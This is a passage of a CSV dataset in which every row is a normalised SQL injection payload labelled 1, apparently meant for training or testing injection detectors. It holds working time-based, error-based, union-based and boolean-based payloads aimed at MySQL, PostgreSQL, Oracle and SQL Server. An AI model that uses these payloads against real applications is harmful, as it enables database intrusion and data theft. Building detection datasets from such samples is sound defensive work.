row_index,payload_norm,label,sqli_type_hint
10560,"select count ( * ) from generate_series ( 1,5000000 ) and ( '%' = '",1,
10561,"1%"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
10562,"1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 'dbsm' = 'dbsm",1,
10563,"1' ) ) ) union all select null,null#",1,
10564,"1' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1,
10565,"1%' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( '%' = '",1,
10566,"-7851"" ) ) or 6872 = 6872 and ( ( ""dvbw"" like ""dvbw",1,
10567,"1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'zknl' = 'zknl",1,
10568,"-6928"" ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""mxhr"" like ""mxhr",1,
10569,"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and 'kjfm' = 'kjfm",1,
10570,select pg_sleep ( 5 ) ) +',1,
10571,"1"" ) where 4382 = 4382 and 6607 = 2394--",1,
10572,"1"" ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( ""krxy"" = ""krxy",1,
10573,"end and ""unqj"" = ""unqj",1,
10574,"-3368' ) ) union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",1,
10575,"1'|| ( select 'zdfo' from dual where 4288 = 4288 union all select null,null,null,null,null,null,null--",1,
10576,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ||'",1,
10577,"1"" ) where 5719 = 5719 rlike sleep ( 5 ) --",1,
10578,1' ) ) ) waitfor delay '0:0:5' and ( ( ( 'zhhf' like 'zhhf,1,
10579,"1%' and make_set ( 1227 = 5627,5627 ) and '%' = '",1,
10580,"-3729' ) ) or elt ( 4482 = 2648,2648 ) and ( ( 'vkkr' like 'vkkr",1,
10581,"( select concat ( 0x7171706a71, ( select ( elt ( 7381 = 7381,1 ) ) ) ,0x717a767a71 ) )",1,
10582,"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and 'egye' = 'egye",1,
10583,1' where 3028 = 3028,1,
10584,( select ( case when ( 4108 = 4108 ) then 1 else 4108* ( select 4108 from information_schema.character_sets ) end ) ),1,
10585,"1"" ) ) as jikg where 8258 = 8258 and ( 3973 = 1047 ) *1047--",1,
10586,"1 ) where 5464 = 5464 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
10587,"1"" ) as wjdc where 8694 = 8694 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",1,
10588,"1 where 3737 = 3737 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
10589,-4954' ) or 8571 = 8571--,1,
